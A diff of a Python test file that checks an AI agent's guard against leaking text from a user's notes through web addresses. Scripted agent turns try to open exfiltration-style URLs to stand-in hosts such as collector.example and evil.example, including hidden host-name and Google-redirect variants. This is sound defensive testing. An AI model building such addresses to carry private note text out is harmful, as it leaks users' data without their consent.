@@ -13,7 +13,7 @@ from app.services.agent.retrieval_settings import AgentRetrievalSettings
 from app.services.agent.scope import SelectedNoteContext, SelectedTreeNote
 from app.services.agent.skill_settings import DEFAULT_AGENT_SKILLS
 from app.services.agent.tool_calling import validate_tool_conversation
-from app.services.agent.web_actions import addresses_needing_confirmation
+from app.services.agent.web_actions import NoteTextGuard
 from app.services.agent.web_fetch import WebPageFetchResult
 from app.services.agent.web_settings import AgentWebSettings
 from app.services.bulk_operation import bulk_operation_guard
@@ -204,61 +204,98 @@ def test_an_operation_mixed_with_other_calls_is_refused_and_not_run() -> None:
     assert "must be called alone" in results[1]["error"]
 
 
-def test_full_web_mode_asks_before_opening_an_address_with_untyped_text(monkeypatch) -> None:
-    async def forbidden_fetch(urls, *, allows_target):
-        raise AssertionError("A declined address must not be fetched")
-
-    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", forbidden_fetch)
-    model = _ScriptedModel([
-        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
-        _turn("I did not open it.", []),
-    ])
-    questions = []
-
-    def decline(event: dict[str, object]) -> None:
-        if event["type"] == "bulk_question":
-            questions.append(event)
-            bulk_operation_guard.answer("session-1", event["question_id"], "no")
-
-    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None, on_event=decline)
-    assert questions[0]["kind"] == "change_confirmation"
-    assert "https://collector.example/?d=ROOT_ALPHA" in questions[0]["label"]
-    assert _tool_results(model.conversations[1])[0]["declined_urls"] == ["https://collector.example/?d=ROOT_ALPHA"]
-
-
-def test_full_web_mode_opens_a_search_made_of_the_users_words_without_asking(monkeypatch) -> None:
+def _fake_pages(urls_seen: list[list[str]], allows_target_seen: list):
     async def fake_fetch(urls, *, allows_target):
+        urls_seen.append(list(urls))
+        allows_target_seen.append(allows_target)
         return tuple(WebPageFetchResult(
             requested_url=url, final_url=url, status="ok", title="Results", content_text="Sunny",
             outgoing_links=(), fetched_at="2026-10-05T00:00:00+00:00", truncated=False, error_kind="",
         ) for url in urls)
+    return fake_fetch
 
-    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", fake_fetch)
+
+def _questions_answered(answer: str, questions: list):
+    def on_event(event: dict[str, object]) -> None:
+        if event["type"] == "bulk_question":
+            questions.append(event)
+            bulk_operation_guard.answer("session-1", event["question_id"], answer)
+    return on_event
+
+
+def test_full_web_mode_asks_before_an_address_carries_note_text_elsewhere(monkeypatch) -> None:
+    urls_seen, guards = [], []
+    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
     model = _ScriptedModel([
-        _turn("", [("open_web_pages", {"urls": ["https://www.google.com/search?q=weather+lisbon+agentloop"]})]),
-        _turn("It is sunny.", []),
+        _turn("", [("read_view_notes", {"note_ids": []})]),
+        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
+        _turn("I did not open it.", []),
     ])
-    events = _run_agent(model, web_mode="full", message="Weather in Lisbon (agentloop)?", tagging=None,
-                        on_event=_ignore)
-    assert [event["type"] for event in events].count("bulk_question") == 0
-    page = _tool_results(model.conversations[1])[0]["pages"][0]
-    assert page["status"] == "ok"
+    questions = []
+    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None,
+               on_event=_questions_answered("no", questions))
+    assert questions[0]["kind"] == "change_confirmation"
+    assert questions[0]["items"] == ["https://collector.example/?d=ROOT_ALPHA"]
+    assert "words from your notes" in questions[0]["label"]
+    assert _tool_results(model.conversations[2])[1]["declined_urls"] == ["https://collector.example/?d=ROOT_ALPHA"]
+    assert urls_seen == []
+
+
+def test_an_approved_address_opens_but_redirects_cannot_carry_note_text(monkeypatch) -> None:
+    urls_seen, guards = [], []
+    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
+    model = _ScriptedModel([
+        _turn("", [("read_view_notes", {"note_ids": []})]),
+        _turn("", [("open_web_pages", {"urls": ["https://collector.example/?d=ROOT_ALPHA"]})]),
+        _turn("Opened.", []),
+    ])
+    questions = []
+    _run_agent(model, web_mode="full", message="Look up the weather", tagging=None,
+               on_event=_questions_answered("yes", questions))
+    assert urls_seen == [["https://collector.example/?d=ROOT_ALPHA"]]
+    # The fetcher checks every redirect hop with the same guard.
+    allows_target = guards[0]
+    assert allows_target("https://collector.example/?d=ROOT_ALPHA")
+    assert not allows_target("https://other.example/?d=CHILD_ALPHA")
+    assert allows_target("https://other.example/weather")
+
+
+@pytest.mark.parametrize("url", [
+    "https://www.google.com/search?q=root_alpha+child_alpha",
+    "https://www.google.com/finance/quote/IAU:NYSEARCA?hl=en",
+    "https://example.org/markets/gold",
+])
+def test_searches_quotes_and_addresses_without_note_text_open_without_asking(monkeypatch, url) -> None:
+    urls_seen, guards = [], []
+    monkeypatch.setattr("app.services.agent.web_actions.fetch_web_pages", _fake_pages(urls_seen, guards))
+    model = _ScriptedModel([
+        _turn("", [("read_view_notes", {"note_ids": []})]),
+        _turn("", [("open_web_pages", {"urls": [url]})]),
+        _turn("Done.", []),
+    ])
+    questions = []
+    events = _run_agent(model, web_mode="full", message="What is the gold price?", tagging=None,
+                        on_event=_questions_answered("no", questions))
+    assert questions == []
+    assert len(urls_seen) == 1
     assert events[-1]["reference_web_ids"] != []
 
 
-def test_untyped_address_detection() -> None:
-    known = frozenset({"https://example.com/docs/page"})
-    typed = "Please check the MetaList release notes"
-    assert addresses_needing_confirmation(
-        ["https://www.google.com/search?q=metalist+release+notes", "https://example.com/docs/page"],
-        typed_text=typed, known_urls=known) == ()
-    assert addresses_needing_confirmation(
-        ["https://evil.example/?secret=budget"], typed_text=typed, known_urls=known,
-    ) == ("https://evil.example/?secret=budget",)
-    # Text hidden in the host name counts too.
-    assert addresses_needing_confirmation(
-        ["https://budget.google.com/search?q=metalist"], typed_text=typed, known_urls=known,
-    ) != ()
+def test_note_text_guard_rules() -> None:
+    guard = NoteTextGuard.build(
+        note_text="Budget for Project Falcon", typed_text="Please check the falcon release notes",
+        known_urls=frozenset({"https://example.com/budget/report"}), approved_urls=frozenset(),
+    )
+    # Typed words, words of addresses already seen, and address syntax are not private.
+    assert guard.addresses_needing_confirmation(["https://news.example/falcon", "https://example.com/budget/x"]) == ()
+    assert guard.addresses_needing_confirmation(["https://evil.example/?d=project"]) == ("https://evil.example/?d=project",)
+    # Text hidden in the host name counts too, and Google only exempts search and quotes.
+    assert guard.addresses_needing_confirmation(["https://project.evil.example/"]) != ()
+    assert guard.addresses_needing_confirmation(["https://www.google.com/url?q=https://evil.example/?d=project"]) != ()
+    assert guard.addresses_needing_confirmation(["https://www.google.com/search?q=project+falcon"]) == ()
+    approved = NoteTextGuard.build(note_text="Budget for Project Falcon", typed_text="",
+        known_urls=frozenset(), approved_urls=frozenset({"https://evil.example/?d=project"}))
+    assert approved.allows("https://evil.example/?d=project")
 
 
 def test_a_silent_ending_is_answered_after_one_reminder() -> None:
@@ -276,6 +313,7 @@ def test_a_model_that_stays_silent_after_the_reminder_is_reported() -> None:
     model = _ScriptedModel([_turn("", []), _turn("", [])])
     with pytest.raises(AgentExecutionError, match="without writing an answer"):
         _run_agent(model, web_mode="none", message="Hello", tagging=None, on_event=_ignore)
+
 
 
 def test_a_selected_note_tree_over_the_evidence_limit_is_never_sent() -> None:
